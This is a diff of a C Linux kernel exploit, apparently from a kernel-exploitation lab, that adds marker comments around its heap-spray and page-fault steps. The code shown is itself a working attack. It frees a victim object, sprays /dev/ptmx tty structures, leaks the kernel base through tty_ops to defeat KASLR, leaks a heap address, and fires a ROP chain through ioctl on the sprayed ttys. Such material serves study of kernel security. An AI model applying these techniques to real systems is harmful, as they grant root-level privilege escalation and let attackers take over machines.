@@ -130,11 +130,13 @@ static void* fault_handler_thread(void* arg)
 
             del(victim);
 
+            // START SPRAY
             for (int i = 0; i < 0x10; i++) {
                 spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
                 if (spray[i] == -1)
                     ERROR("/dev/ptmx");
             }
+            // END SPRAY
 
             copy.src = (uint64_t)buf;
             break;
@@ -146,11 +148,14 @@ static void* fault_handler_thread(void* arg)
             }
 
             del(victim);
+
+            // START SPRAY
             for (int i = 0; i < 0x10; i++) {
                 spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
                 if (spray[i] == -1)
                     ERROR("/dev/ptmx");
             }
+            // END SPRAY
 
             copy.src = (uint64_t)buf;
             break;
@@ -225,12 +230,12 @@ int main()
     buf = (char*)malloc(0x400);
     // KASLRの回避
     victim = add(buf, 0x400);
-    get(victim, page, 0x20);
+    get(victim, page, 0x20); // page fault 0
     kbase = *(uint64_t*)&page[0x18] - ofs_tty_ops;
     printf("[+] kbase = 0x%016lx\n", kbase);
 
     victim = add(buf, 0x400);
-    get(victim, page + 0x1000, 0x400);
+    get(victim, page + 0x1000, 0x400); // page fault 1
     g_buf = *(uint64_t*)&page[0x1000 + 0x38] - 0x38;
     printf("[+] g_buf = 0x%016lx\n", g_buf);
     // END KASLRの回避
@@ -259,7 +264,7 @@ int main()
     *chain++ = user_ss;
 
     victim = add(buf, 0x400);
-    set(victim, page + 0x2000, 0x400);
+    set(victim, page + 0x2000, 0x400); // page fault 2
 
     for (int i = 0; i < 0x10; i++) {
         ioctl(spray[i], 0, g_buf + 0x100);
